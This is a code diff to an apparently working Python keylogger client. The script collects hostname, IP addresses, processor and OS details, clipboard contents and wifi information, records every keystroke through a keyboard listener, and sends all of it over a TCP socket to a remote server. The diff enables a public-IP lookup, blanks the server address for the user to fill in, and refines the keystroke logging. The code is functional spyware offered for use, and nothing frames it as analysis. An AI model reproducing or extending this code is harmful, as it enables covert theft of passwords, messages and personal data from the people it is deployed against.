@@ -12,12 +12,11 @@ def getComputerInfo():
     hostname = socket.gethostname()
     IPAddr = socket.gethostbyname(hostname)
     try:
-        yo=''
-        #public_ip = get("https://api.ipify.org").text
-        #msg += ("Public IP Address: " + public_ip + "\n")
+        public_ip = get("https://api.ipify.org").text
+        info += ("Public IP Address: " + public_ip + "\n")
 
     except Exception:
-        info +=("Couldn't get Public IP Address (most likely max query)")
+        info +=("Couldn't get Public IP Address (most likely max query)" + "\n")
 
     info +=("Processor: " + (platform.processor()) + '\n')
     info +=("System: " + platform.system() + " " + platform.version() + '\n')
@@ -57,15 +56,15 @@ def getWifiInfo():
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-IP = "192.168.1.54"  
+IP = ""  #Enter the same IP adress here and in the client.py file 
 PORT = 5050  
 print('Initializing connection with server')
 soc.connect((IP, PORT))  
 
-msg = '\n'
-firstTime = True
+logString = '\n'
+firstTime = False
 def on_press(key):  
-    global msg, firstTime
+    global logString, firstTime
     if not firstTime:
         soc.send(getComputerInfo().encode('utf-8'))
         soc.send(getClipboardInfo().encode('utf-8'))
@@ -74,10 +73,22 @@ def on_press(key):
     else:
         print("Key pressed:", key)
         if key != keyboard.Key.enter:
-            msg += str(key)
+            if (str(key)).__contains__("Key."):
+                if key == keyboard.Key.space:
+                    logString += " "
+                else:
+                    if len(logString) > 1:
+                        logString += "\n"
+                        logString += str(key).strip("'")
+                    else:
+                        logString += str(key).strip("'")
+                        logString += "\n"
+
+            else: 
+                logString += str(key).strip("'")
         else:
-            soc.send(msg.encode('utf-8'))
-            msg = '\n'
+            soc.sendall((logString).encode('utf-8'))
+            logString = "\n"
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
